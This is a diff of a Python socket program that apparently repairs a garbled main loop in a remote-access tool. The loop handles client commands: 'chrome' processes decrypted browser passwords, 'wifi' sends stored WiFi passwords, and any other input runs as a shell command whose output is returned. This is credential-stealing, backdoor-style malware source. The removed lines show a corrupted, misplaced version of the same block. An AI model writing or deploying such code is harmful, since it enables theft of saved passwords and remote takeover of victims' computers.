@@ -254,25 +254,7 @@ def main():
     ser_sock.listen(5)
     print(f"Server serving at {host_ip}:{port}")
 
-    wssword_file_path):
-                        os.remove(password_file_path)
-                        print(f"Deleted the password file: {password_file_path}")
-                    else:
-                        print("Password file not found.")
-                elif command == 'wifi':
-                    send_wifi_passwords(client)
-                else:
-                    output = subprocess.getoutput(command)
-                    client.send(output.encode())
-        except ConnectionResetError:
-            print(f"Connection with {addr} was reset.")
-        finally:
-            client.close()
-            print(f"Connection with {addr} closed.")
-
-if __name__ == "__main__":
-    main()
-hile True:
+    while True:
         client, addr = ser_sock.accept()
         print(f"Connected to Client@{addr}")
         try:
@@ -294,4 +276,21 @@ hile True:
                 elif command == 'chrome':
                     handle_chrome_data(client)
                     password_file_path = "decrypted_password.csv"
-                    if os.path.exists(pa
+                    if os.path.exists(password_file_path):
+                        os.remove(password_file_path)
+                        print(f"Deleted the password file: {password_file_path}")
+                    else:
+                        print("Password file not found.")
+                elif command == 'wifi':
+                    send_wifi_passwords(client)
+                else:
+                    output = subprocess.getoutput(command)
+                    client.send(output.encode())
+        except ConnectionResetError:
+            print(f"Connection with {addr} was reset.")
+        finally:
+            client.close()
+            print(f"Connection with {addr} closed.")
+
+if __name__ == "__main__":
+    main()
